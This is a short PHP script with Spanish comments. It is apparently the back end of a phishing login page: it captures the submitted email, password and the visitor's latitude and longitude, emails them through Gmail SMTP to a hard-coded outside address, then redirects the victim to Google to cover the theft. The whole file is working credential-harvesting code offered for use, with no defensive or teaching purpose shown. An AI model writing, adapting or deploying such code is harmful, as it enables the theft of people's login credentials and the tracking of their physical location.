<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Incluir PHPMailer (ajusta la ruta si es necesario)
require 'vendor/autoload.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capturar los datos del formulario
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    $latitude = htmlspecialchars($_POST['latitude']);
    $longitude = htmlspecialchars($_POST['longitude']);

    // Configuración del correo
    $mail = new PHPMailer(true);
    try {
        // Configuración del servidor SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'nocponer12@gmail.com'; // Reemplaza con tu correo
        $mail->Password = 'TU_CONTRASEÑA_DE_APLICACIÓN'; // Contraseña de aplicación o tu contraseña
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Configuración del correo
        $mail->setFrom('TU_CORREO@gmail.com', 'Formulario de Login');
        $mail->addAddress('nocponer12@gmail.com'); // Receptor
        $mail->Subject = 'Datos de inicio de sesión';

        // Contenido del mensaje
        $mail->isHTML(true);
        $mail->Body = "
            <h2>Datos de inicio de sesión recibidos</h2>
            <p><strong>Correo electrónico:</strong> $email</p>
            <p><strong>Contraseña:</strong> $password</p>
            <p><strong>Ubicación:</strong></p>
            <p><strong>Latitud:</strong> $latitude</p>
            <p><strong>Longitud:</strong> $longitude</p>
        ";

        // Enviar correo
        if ($mail->send()) {
            // Redirigir al usuario a la página de inicio de Google
            header("Location: https://www.google.com");
            exit; // Asegura que el script se detenga después de la redirección
        }
    } catch (Exception $e) {
        echo "<h1>Error al enviar el correo</h1>";
        echo "Error: {$mail->ErrorInfo}";
    }
} else {
    echo "<h1>Acceso no autorizado</h1>";
}
?>